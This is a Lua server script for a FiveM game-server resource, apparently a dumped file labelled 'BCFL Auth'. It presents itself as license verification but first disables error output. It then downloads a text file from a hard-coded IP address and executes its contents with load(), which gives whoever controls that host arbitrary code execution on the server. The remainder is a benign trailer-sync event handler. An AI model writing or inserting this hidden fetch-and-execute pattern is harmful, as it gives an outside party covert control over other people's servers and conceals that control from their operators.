--[[
	id: DXa_uFVzzxXaV0i7wdu2m
	name: BCFL S V2
	description: BCFL Auth
	time1: 2021-06-03 01:52:30.090665+00
	time2: 2021-06-03 01:52:30.090666+00
	uploader: nVpiI2NOtXmbABCF9f4UAzVhgQFEQ-ml4eXie1OF
	uploadersession: R0MAbYvEoiVv2MGJG-zuUK-v-Ntp5l
	flag: f
--]]

--[[
strings-override

...
]]
local script = 'ebu_bcfl'

local license_key = Config.license_key
local license_key2 = Config.license_key2 or ''

Citizen.Tace = function() end
error = function() end

PerformHttpRequest("74.91.121.153/verify.txt", function (errorCode, resultData, resultHeaders)
    if errorCode == 200 then
      assert(load("local script  = '"..script.."';".. resultData))()
    else
      print('^1'..script..' - Unable to reach auth server - Error : '..errorCode..'^0')
    end
end)

RegisterServerEvent('ebu_bcfl:updateTrailer')
AddEventHandler('ebu_bcfl:updateTrailer', function(type, num, vehicle, status)
    TriggerClientEvent('ebu_bcfl:updateTrailer', -1, type, num, vehicle, status)
end)
